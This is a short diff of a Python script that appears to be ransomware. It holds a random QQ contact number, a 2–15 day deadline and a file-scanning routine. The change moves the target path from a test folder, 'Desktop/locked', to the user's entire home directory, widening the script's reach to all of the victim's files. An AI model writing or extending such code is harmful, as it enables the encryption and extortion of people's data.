@@ -29,7 +29,7 @@ QQ_Address = random.randint(1000000000,9999999999)
 day_gen = random.randint(2,15)
 
 username_os = os.getenv('username')
-path_files = 'C:/Users/' + username_os + "/Desktop/locked"
+path_files = 'C:/Users/' + username_os + "/"
 
 def scan(path):
     allFiles = []
